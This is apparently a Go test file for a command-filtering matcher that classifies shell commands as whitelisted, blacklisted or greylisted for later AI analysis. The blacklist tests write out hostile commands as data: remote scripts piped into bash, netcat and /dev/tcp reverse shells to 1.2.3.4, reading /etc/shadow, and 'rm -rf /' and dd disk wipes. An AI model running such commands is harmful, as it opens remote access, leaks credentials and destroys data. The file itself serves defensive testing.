package filter

import (
	"regexp"
	"testing"
)

func TestWhitelistPattern(t *testing.T) {
	m := NewMatcher()

	tests := []struct {
		cmd      string
		filenames []string
		argv     string
		want     Result
	}{
		{"ls", nil, "", Whitelisted},
		{"ls -la", nil, "", Whitelisted},
		{"pwd", nil, "", Whitelisted},
		{"cd /tmp", nil, "", Whitelisted},
		{"echo hello", nil, "", Whitelisted},
		{"cat", []string{"/var/log/syslog"}, "", Whitelisted},
		{"cat", []string{"/etc/config.yaml"}, "", Whitelisted},
		{"ps aux", nil, "", Whitelisted},
		{"grep 'error'", []string{"/var/log/app.log"}, "", Whitelisted},
		{"tar -xzf archive.tar.gz", nil, "", Whitelisted},
		{"ssh user@host `ls`", nil, "", Greylisted}, // backticks make it suspicious
	}

	for _, tt := range tests {
		got, desc := m.Match(tt.cmd, tt.filenames, tt.argv)
		if got != tt.want {
			t.Errorf("Match(%q, %v, %q) = %v (%s), want %v", tt.cmd, tt.filenames, tt.argv, got, desc, tt.want)
		}
	}
}

func TestBlacklistPattern(t *testing.T) {
	m := NewMatcher()

	tests := []struct {
		cmd      string
		filenames []string
		argv     string
		want     Result
	}{
		{"cat", []string{"/etc/shadow"}, "", Blacklisted},
		{"wget", nil, "http://1.2.3.4/script.sh | bash", Blacklisted},
		{"curl", nil, "http://1.2.3.4/script.sh | bash", Blacklisted},
		{"nc", nil, "-e /bin/bash 1.2.3.4 4444", Blacklisted},
		{"/dev/tcp/1.2.3.4/4444", nil, "", Blacklisted},
		{"nmap", nil, "-sS -p 1-1000 target", Blacklisted},
		{"chmod", nil, "4777 /bin/su", Blacklisted},
		{"rm", nil, "-rf /", Blacklisted},
		{"dd", nil, "if=/dev/zero of=/dev/sda", Blacklisted},
	}

	for _, tt := range tests {
		got, desc := m.Match(tt.cmd, tt.filenames, tt.argv)
		if got != tt.want {
			t.Errorf("Match(%q, %v, %q) = %v (%s), want %v", tt.cmd, tt.filenames, tt.argv, got, desc, tt.want)
		}
	}
}

func TestGreylistPattern(t *testing.T) {
	m := NewMatcher()

	tests := []struct {
		cmd      string
		filenames []string
		argv     string
		want     Result
	}{
		{"curl", nil, "http://example.com/api", Greylisted},
		{"wget", nil, "http://example.com/file", Greylisted},
		{"bash", nil, "-c 'ls'", Greylisted},
		{"python3", nil, "-m http.server 8000", Greylisted},
		{"sudo", nil, "ls", Greylisted},
		{"chmod", nil, "755 script.sh", Greylisted},
		{"chown", nil, "root:root file", Greylisted},
		{"useradd", nil, "newuser", Greylisted},
		{"passwd", nil, "username", Greylisted},
		{"/tmp/malware.sh", []string{"/tmp/malware.sh"}, "", Greylisted},
		{"curl", nil, "http://api.example.com", Greylisted},
	}

	for _, tt := range tests {
		got, desc := m.Match(tt.cmd, tt.filenames, tt.argv)
		if got != tt.want {
			t.Errorf("Match(%q, %v, %q) = %v (%s), want %v", tt.cmd, tt.filenames, tt.argv, got, desc, tt.want)
		}
	}
}

func TestDefaultToGreylist(t *testing.T) {
	m := NewMatcher()

	// Unknown commands should default to greylist
	result, desc := m.Match("some_unknown_command", nil, "")
	if result != Greylisted {
		t.Errorf("expected Greylisted for unknown command, got %v", result)
	}
	if desc != "no matching pattern, default to AI analysis" {
		t.Errorf("unexpected description: %s", desc)
	}
}

func TestMatcherStats(t *testing.T) {
	m := NewMatcher()
	s := m.String()
	if s == "" {
		t.Error("String() should not be empty")
	}
}

func TestAddPattern(t *testing.T) {
	m := NewMatcher()

	// Add a custom whitelist pattern
	m.AddPattern(regexp.MustCompile("(?i)my-safe-cmd"), "my safe command", Whitelisted)

	result, _ := m.Match("my-safe-cmd", nil, "")
	if result != Whitelisted {
		t.Errorf("expected Whitelisted, got %v", result)
	}
}

func TestResultString(t *testing.T) {
	tests := []struct {
		r    Result
		want string
	}{
		{Whitelisted, "whitelisted"},
		{Blacklisted, "blacklisted"},
		{Greylisted, "greylisted"},
		{Result(255), "unknown"},
	}

	for _, tt := range tests {
		got := tt.r.String()
		if got != tt.want {
			t.Errorf("Result(%d).String() = %q, want %q", tt.r, got, tt.want)
		}
	}
}
